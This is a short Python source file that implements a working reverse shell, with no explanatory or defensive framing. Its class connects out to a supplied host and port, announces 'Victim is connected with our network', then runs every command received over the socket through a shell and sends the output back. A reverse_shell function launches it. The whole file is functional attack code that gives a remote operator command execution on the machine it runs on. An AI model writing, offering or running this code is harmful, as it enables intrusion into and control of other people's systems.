import socket
import subprocess
import os


class network:
    def __init__(self, host, port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = socket.gethostbyname(host)
        self.port = port
        self.server.connect((self.host, self.port))
        self.pwd = subprocess.check_output('pwd').decode("utf-8").rstrip()

        self.handlecon()


    def subprocess_cmd(self,command):
        process = subprocess.Popen(command,stdout=subprocess.PIPE, shell=True)
        proc_stdout = process.communicate()[0].strip()
        return proc_stdout


    def handlecon(self):
        # print(f"connected")
        self.server.send(b"Victim is connected with our network\n")
        self.server.send(b"$")
        while True:
            raw_cmd = self.server.recv(1024).decode("utf-8").rstrip()
            cmd = raw_cmd.split(" ")
            if cmd[0] == "quit":
                self.server.close()
                break

            elif cmd[0] == "cd" and len(cmd) == 2:
                self.pwd = self.subprocess_cmd(f"cd {self.pwd} && cd {cmd[1]} && pwd").decode("utf-8").rstrip()
                self.server.send(bytes(self.pwd,"utf-8"))
                self.server.send(b"\n$")

            else:
                try:
                    output = self.subprocess_cmd(f"cd {self.pwd} && {raw_cmd}").decode("utf-8").rstrip()
                    self.server.send(bytes(output,"utf-8"))
                    self.server.send(b"\n$")
                except Exception as e:
                    print(e)
                    self.server.send(b"cmd error check again ...,\n")
                    self.server.send(b"\n$")


def reverse_shell(host,port):
	network(host,port)